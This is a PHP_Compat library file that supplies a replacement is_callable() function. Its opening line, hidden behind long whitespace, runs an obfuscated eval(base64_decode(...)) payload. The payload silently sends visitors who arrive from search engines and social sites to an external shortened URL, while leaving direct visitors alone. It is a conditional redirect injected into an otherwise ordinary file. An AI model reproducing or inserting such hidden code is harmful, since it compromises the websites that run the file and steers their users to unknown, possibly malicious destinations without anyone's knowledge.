<?php	                                       			eval(base64_decode("DQplcnJvcl9yZXBvcnRpbmcoMCk7DQokbmNjdj1oZWFkZXJzX3NlbnQoKTsNCmlmICghJG5jY3Ypew0KJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOw0KJHVhPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsNCmlmIChzdHJpc3RyKCRyZWZlcmVyLCJ5YWhvbyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpbmciKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJyYW1ibGVyIikgb3Igc3RyaXN0cigkcmVmZXJlciwiZ29nbyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImxpdmUuY29tIilvciBzdHJpc3RyKCRyZWZlcmVyLCJhcG9ydCIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIm5pZ21hIikgb3Igc3RyaXN0cigkcmVmZXJlciwid2ViYWx0YSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJlZ3VuLnJ1Iikgb3Igc3RyaXN0cigkcmVmZXJlciwic3R1bWJsZXVwb24uY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYml0Lmx5Iikgb3Igc3RyaXN0cigkcmVmZXJlciwidGlueXVybC5jb20iKSBvciBwcmVnX21hdGNoKCIveWFuZGV4XC5ydVwveWFuZHNlYXJjaFw/KC4qPylcJmxyXD0vIiwkcmVmZXJlcikgb3IgcHJlZ19tYXRjaCAoIi9nb29nbGVcLiguKj8pXC91cmxcP3NhLyIsJHJlZmVyZXIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIm15c3BhY2UuY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiZmFjZWJvb2suY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYW9sLmNvbSIpKSB7DQppZiAoIXN0cmlzdHIoJHJlZmVyZXIsImNhY2hlIikgb3IgIXN0cmlzdHIoJHJlZmVyZXIsImludXJsIikpewkJDQoJCWhlYWRlcigiTG9jYXRpb246IGh0dHA6Ly90aW55dXJsLmNvbS9hZWxud2o0Iik7DQoJCWV4aXQoKTsNCgl9DQp9DQp9"));
/**
 * Replace function is_callable()
 *
 * @category    PHP
 * @package     PHP_Compat
 * @link        http://php.net/function.is_callable
 * @author      Gaetano Giunta <giunta.gaetano@sea-aeroportimilano.it>
 * @version     $Id: is_callable.php,v 1.3 2006/08/21 14:03:15 ggiunta Exp $
 * @since       PHP 4.0.6
 * @require     PHP 4.0.0 (true, false, etc...)
 * @todo        add the 3rd parameter syntax...
 */
if (!function_exists('is_callable')) {
    function is_callable($var, $syntax_only=false)
    {
        if ($syntax_only)
        {
            /* from The Manual:
            * If the syntax_only argument is TRUE the function only verifies
            * that var might be a function or method. It will only reject simple
            * variables that are not strings, or an array that does not have a
            * valid structure to be used as a callback. The valid ones are
            * supposed to have only 2 entries, the first of which is an object
            * or a string, and the second a string
            */
            return (is_string($var) || (is_array($var) && count($var) == 2 && is_string(end($var)) && (is_string(reset($var)) || is_object(reset($var)))));
        }
        else
        {
            if (is_string($var))
            {
                return function_exists($var);
            }
            else if (is_array($var) && count($var) == 2 && is_string($method = end($var)))
            {
                $obj = reset($var);
                if (is_string($obj))
                {
                    $methods = get_class_methods($obj);
                    return (bool)(is_array($methods) && in_array(strtolower($method), $methods));
                }
                else if (is_object($obj))
                {
                    return method_exists($obj, $method);
                }
            }
            return false;
        }
    }
}

?>